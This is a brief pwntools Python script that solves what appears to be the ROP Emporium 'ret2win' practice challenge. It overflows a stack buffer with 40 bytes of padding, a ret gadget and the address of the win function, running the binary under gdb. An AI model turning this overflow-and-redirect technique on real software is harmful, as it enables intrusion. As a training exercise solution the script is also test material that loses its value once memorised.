from pwn import *

elf = ELF("./ret2win")

#io = process(elf.path)
io = gdb.debug(elf.path)

rop = ROP(elf)

io.sendline(b"A" * 40 + \
        p64(rop.ret.address) + \
        p64(elf.symbols["ret2win"]))

io.interactive()
